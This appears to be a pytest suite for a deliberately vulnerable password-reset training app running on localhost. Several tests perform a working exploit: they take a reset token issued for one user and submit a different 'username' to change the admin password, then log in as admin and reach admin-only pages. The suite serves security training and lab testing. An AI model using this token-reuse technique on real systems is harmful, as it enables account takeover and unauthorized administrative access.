import pytest
import requests
import time
import re
from urllib.parse import urljoin, urlparse, parse_qs

BASE_URL = "http://localhost:3206"

class TestPasswordResetTraining:
    
    @pytest.fixture(autouse=True)
    def setup(self):
        """Wait for application to be ready"""
        max_retries = 30
        for i in range(max_retries):
            try:
                response = requests.get(f"{BASE_URL}/", timeout=5)
                if response.status_code in [200, 302]:
                    break
            except requests.exceptions.RequestException:
                if i == max_retries - 1:
                    pytest.fail("Application not ready after 30 attempts")
                time.sleep(2)
    
    def test_application_loads(self):
        """Test that the application loads successfully"""
        response = requests.get(BASE_URL)
        assert response.status_code in [200, 302]
    
    def test_login_page_shows_users(self):
        """Test that login page shows the list of users"""
        response = requests.get(f"{BASE_URL}/login")
        assert response.status_code == 200
        assert "jennifer.morgan (You)" in response.text
        assert "admin" in response.text
        assert "david.chen" in response.text
        assert "Manager" in response.text
        assert "Administrator" in response.text
    
    def test_forgot_password_restricts_to_jennifer(self):
        """Test that forgot password only works for jennifer.morgan"""
        session = requests.Session()
        
        # Try with admin user (should fail)
        response = session.post(f"{BASE_URL}/forgot-password", data={
            'username': 'admin'
        })
        assert response.status_code == 200
        assert "only available for your account" in response.text
        
        # Try with jennifer.morgan (should succeed)
        response = session.post(f"{BASE_URL}/forgot-password", data={
            'username': 'jennifer.morgan'
        })
        assert response.status_code == 302  # Should redirect to reset page
    
    def test_direct_reset_password_access(self):
        """Test that reset password page redirects directly from forgot password"""
        session = requests.Session()
        
        response = session.post(f"{BASE_URL}/forgot-password", data={
            'username': 'jennifer.morgan'
        }, allow_redirects=False)
        
        assert response.status_code == 302
        location = response.headers.get('Location', '')
        assert 'reset-password' in location
        assert 'temp-forgot-password-token' in location
    
    def test_password_reset_vulnerability_exploit(self):
        """Test the password reset vulnerability exploitation"""
        print("\n🎯 Testing Password Reset Vulnerability Exploitation")
        
        session = requests.Session()
        
        # Step 1: Request password reset for jennifer.morgan
        print("📧 Step 1: Requesting password reset for jennifer.morgan...")
        response = session.post(f"{BASE_URL}/forgot-password", data={
            'username': 'jennifer.morgan'
        }, allow_redirects=False)
        
        assert response.status_code == 302
        reset_url = response.headers['Location']
        print(f"✅ Reset URL received: {reset_url}")
        
        # Step 2: Extract token from redirect URL
        parsed_url = urlparse(reset_url)
        query_params = parse_qs(parsed_url.query)
        token = query_params.get('temp-forgot-password-token', [''])[0]
        assert token, "Token should be present in URL"
        print(f"🔑 Token extracted: {token[:20]}...")
        
        # Step 3: Exploit vulnerability - change admin password instead!
        print("🔥 Step 3: Exploiting vulnerability - changing admin password...")
        exploit_response = session.post(f"{BASE_URL}/reset-password", data={
            'username': 'admin',  # Vulnerability: can change any user's password!
            'new_password': 'newadminpass123',
            'confirm_password': 'newadminpass123'
        }, params={'temp-forgot-password-token': token})
        
        assert exploit_response.status_code == 302 or "successfully reset" in exploit_response.text
        print("💥 Vulnerability exploited! Admin password changed successfully")
        
        # Step 4: Login as admin with new password
        print("🔓 Step 4: Logging in as admin with new password...")
        login_response = session.post(f"{BASE_URL}/login", data={
            'username': 'admin',
            'password': 'newadminpass123'
        })
        
        assert login_response.status_code == 302 or "dashboard" in login_response.url
        print("✅ Successfully logged in as admin!")
        
        # Step 5: Verify admin access
        print("🏆 Step 5: Verifying admin dashboard access...")
        dashboard_response = session.get(f"{BASE_URL}/dashboard")
        assert dashboard_response.status_code == 200
        print("✅ Admin dashboard accessible - Exploitation complete!")
        
        print("\n🎉 PASSWORD RESET VULNERABILITY SUCCESSFULLY EXPLOITED!")
        print("🔥 Attack Summary:")
        print("   - Requested reset for jennifer.morgan")
        print("   - Exploited missing token validation")
        print("   - Changed admin password using token")
        print("   - Gained unauthorized admin access")
    
    def test_admin_access_after_exploit(self):
        """Test admin functionality after successful exploitation"""
        session = requests.Session()
        
        # Repeat exploit to ensure admin access
        response = session.post(f"{BASE_URL}/forgot-password", data={
            'username': 'jennifer.morgan'
        }, allow_redirects=False)
        
        reset_url = response.headers['Location']
        parsed_url = urlparse(reset_url)
        query_params = parse_qs(parsed_url.query)
        token = query_params.get('temp-forgot-password-token', [''])[0]
        
        session.post(f"{BASE_URL}/reset-password", data={
            'username': 'admin',
            'new_password': 'exploited123',
            'confirm_password': 'exploited123'
        }, params={'temp-forgot-password-token': token})
        
        # Login as admin
        session.post(f"{BASE_URL}/login", data={
            'username': 'admin',
            'password': 'exploited123'
        })
        
        # Test admin-level access
        inventory_response = session.get(f"{BASE_URL}/inventory")
        assert inventory_response.status_code == 200
        assert "Inventory Management" in inventory_response.text or "inventory" in inventory_response.text.lower()
        
        profile_response = session.get(f"{BASE_URL}/profile")
        assert profile_response.status_code == 200
        assert "admin" in profile_response.text
        
        print("✅ TRAINING COMPLETE: Admin privileges obtained through password reset exploit!")
    
    def test_jennifer_password_change_workflow(self):
        """Test the intended workflow for Jennifer's password change"""
        session = requests.Session()
        
        # Step 1: Go to forgot password (as Jennifer)
        response = session.get(f"{BASE_URL}/forgot-password")
        assert response.status_code == 200
        assert "jennifer.morgan (You)" in response.text
        
        # Step 2: Submit forgot password form
        response = session.post(f"{BASE_URL}/forgot-password", data={
            'username': 'jennifer.morgan'
        }, allow_redirects=False)
        
        assert response.status_code == 302
        
        # Step 3: Change Jennifer's own password (legitimate use)
        reset_url = response.headers['Location']
        parsed_url = urlparse(reset_url)
        query_params = parse_qs(parsed_url.query)
        token = query_params.get('temp-forgot-password-token', [''])[0]
        
        response = session.post(f"{BASE_URL}/reset-password", data={
            'username': 'jennifer.morgan',
            'new_password': 'NewJenniferPass123!',
            'confirm_password': 'NewJenniferPass123!'
        }, params={'temp-forgot-password-token': token})
        
        assert response.status_code == 302 or "successfully reset" in response.text
        
        # Step 4: Login with new password
        login_response = session.post(f"{BASE_URL}/login", data={
            'username': 'jennifer.morgan',
            'password': 'NewJenniferPass123!'
        })
        
        assert login_response.status_code == 302 or "dashboard" in login_response.url
        print("✅ Jennifer's legitimate password change workflow works correctly")
